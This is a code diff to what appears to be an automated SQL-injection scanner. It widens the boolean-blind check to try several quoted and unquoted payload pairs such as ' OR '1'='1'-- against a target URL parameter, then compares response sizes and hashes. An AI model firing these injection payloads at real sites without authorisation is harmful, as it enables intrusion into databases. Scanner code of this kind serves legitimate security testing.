@@ -369,45 +369,54 @@ async def test_sqli(
                     }
 
         # Phase 3: Boolean-blind — compare true vs false conditions
-        true_url = _replace_param(target_url, param, f"{original_value} OR 1=1")
-        false_url = _replace_param(target_url, param, f"{original_value} AND 1=2")
-        _, true_body, _ = await _send(session, true_url)
-        _, false_body, _ = await _send(session, false_url)
+        # Try multiple payload styles (with and without quotes)
+        blind_pairs = [
+            (f"{original_value} OR 1=1", f"{original_value} AND 1=2"),
+            (f"{original_value}' OR '1'='1", f"{original_value}' AND '1'='2"),
+            (f"{original_value}' OR '1'='1'--", f"{original_value}' AND '1'='2'--"),
+            (f"{original_value}\" OR \"1\"=\"1", f"{original_value}\" AND \"1\"=\"2"),
+        ]
 
-        if true_body and false_body:
-            true_len = len(true_body)
-            false_len = len(false_body)
-            # Significant size difference between true/false = blind SQLi
-            # true condition should return MORE data than false condition
-            if (true_len > false_len
-                    and abs(true_len - false_len) > 200
-                    and abs(true_len - baseline_len) < 1000):
-                return {
-                    "vulnerable": True,
-                    "url": target_url,
-                    "param": param,
-                    "technique": "boolean-blind",
-                    "payload": f"{original_value} OR 1=1 vs {original_value} AND 1=2",
-                    "evidence": (
-                        f"Response size diff: true={true_len}, "
-                        f"false={false_len}, baseline={baseline_len}"
-                    ),
-                    "confidence": "medium",
-                }
+        for true_payload, false_payload in blind_pairs:
+            true_url = _replace_param(target_url, param, true_payload)
+            false_url = _replace_param(target_url, param, false_payload)
+            _, true_body, _ = await _send(session, true_url)
+            _, false_body, _ = await _send(session, false_url)
 
-            # Content-based comparison — different content even if similar size
-            if true_body != false_body and true_body != baseline_body:
-                # Use simple hash comparison
-                true_hash = hashlib.md5(true_body.encode()).hexdigest()[:8]
-                false_hash = hashlib.md5(false_body.encode()).hexdigest()[:8]
-                baseline_hash = hashlib.md5(baseline_body.encode()).hexdigest()[:8]
-                if true_hash != false_hash and true_hash != baseline_hash:
+            if true_body and false_body:
+                true_len = len(true_body)
+                false_len = len(false_body)
+                # Significant size difference between true/false = blind SQLi
+                # Case 1: OR 1=1 returns more than AND 1=2
+                # Case 2: AND 1=2 returns less than baseline (true == baseline)
+                size_diff = abs(true_len - false_len)
+                if (size_diff > 200
+                        and (true_len > false_len or false_len < baseline_len - 200)):
                     return {
                         "vulnerable": True,
-                        "url": true_url,
+                        "url": target_url,
                         "param": param,
                         "technique": "boolean-blind",
-                        "payload": f"{original_value} OR 1=1 vs {original_value} AND 1=2",
+                        "payload": f"{true_payload} vs {false_payload}",
+                        "evidence": (
+                            f"Response size diff: true={true_len}, "
+                            f"false={false_len}, baseline={baseline_len}"
+                        ),
+                        "confidence": "medium",
+                    }
+
+                # Content-based comparison — different content even if similar size
+                if true_body != false_body and true_body != baseline_body:
+                    true_hash = hashlib.md5(true_body.encode()).hexdigest()[:8]
+                    false_hash = hashlib.md5(false_body.encode()).hexdigest()[:8]
+                    baseline_hash = hashlib.md5(baseline_body.encode()).hexdigest()[:8]
+                    if true_hash != false_hash and true_hash != baseline_hash:
+                        return {
+                            "vulnerable": True,
+                            "url": true_url,
+                            "param": param,
+                            "technique": "boolean-blind",
+                            "payload": f"{true_payload} vs {false_payload}",
                         "evidence": f"Content differs: true={true_hash}, false={false_hash}, baseline={baseline_hash}",
                         "confidence": "medium",
                     }
